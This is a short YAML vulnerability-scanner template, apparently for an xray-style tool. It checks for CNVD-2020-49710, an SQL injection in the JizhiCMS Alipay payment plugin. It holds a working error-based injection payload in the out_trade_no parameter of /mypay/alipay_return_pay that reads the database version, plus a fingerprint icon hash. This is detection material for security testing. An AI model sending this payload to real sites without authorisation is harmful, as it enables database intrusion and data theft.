expression: r0()
id: CNVD-2020-49710
info:
  author: daffainfo
  description: "\u6781\u81F4CMS\u652F\u4ED8\u63D2\u4EF6\u4E2D\u5B58\u5728SQL\u6CE8\
    \u5165\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u6570\
    \u636E\u5E93\u4FE1\u606F icon_hash=\"1657387632\""
  name: "\u6781\u81F4CMS alipay_return_pay SQL\u6CE8\u5165\u6F0F\u6D1ECNVD-2020-49710"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS%20alipay_return_pay%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: critical
rules:
  r0:
    expression: r"~(.*?)~".bmatches(response.body) && response.body.bcontains(b'XPATH
      syntax error:') && response.body.bcontains(b'jz_orders')
    request:
      method: GET
      path: /mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select
        version()),0x7e),1)--+"
